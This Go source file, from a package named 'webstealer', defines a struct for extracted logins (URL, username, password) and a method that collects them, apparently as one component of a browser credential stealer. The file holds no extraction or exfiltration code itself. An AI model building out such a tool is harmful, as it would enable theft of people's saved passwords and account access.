package webstealer

import "net/url"

// Credential stores one extracted login entry.
type Credential struct {
	URL      string
	Username string
	Password string
}

// Results groups extracted credentials.
type Results struct {
	Credentials []Credential
}

// AddCredentials will add credentialsto results.
func (r *Results) AddCredentials(urlDomain, username, password string) {
	if password == "" {
		return
	}

	if parsedURL, err := url.Parse(urlDomain); err == nil {
		urlDomain = parsedURL.Hostname()
	}

	r.Credentials = append(
		r.Credentials,
		Credential{
			URL:      urlDomain,
			Username: username,
			Password: password,
		},
	)
}
